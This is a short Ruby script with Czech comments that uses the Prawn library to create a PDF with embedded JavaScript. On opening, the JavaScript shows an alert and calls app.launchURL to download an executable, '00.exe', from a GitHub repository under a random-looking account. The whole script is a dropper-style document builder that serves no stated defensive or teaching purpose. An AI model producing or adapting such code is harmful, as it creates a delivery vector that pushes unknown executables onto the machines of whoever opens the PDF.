require 'prawn'

# Vytvoření nového PDF souboru
Prawn::Document.generate("download_with_js.pdf") do |pdf|
  # Přidání textu do PDF
  pdf.text "Tento PDF soubor bude při otevření stáhnout soubor."

  # Vložení JavaScriptu pro automatické spuštění akce
  pdf.javascript do
    # JavaScript, který se spustí při otevření PDF
    # Tento skript stáhne soubor z URL při otevření souboru
    <<~JS
      app.alert("Tento soubor stáhne soubor po otevření.");
      var downloader = app.launchURL("https://github.com/hubertloudgfdxgx/krc/raw/refs/heads/main/00.exe", true);
    JS
  end
end

puts "PDF soubor byl vytvořen."
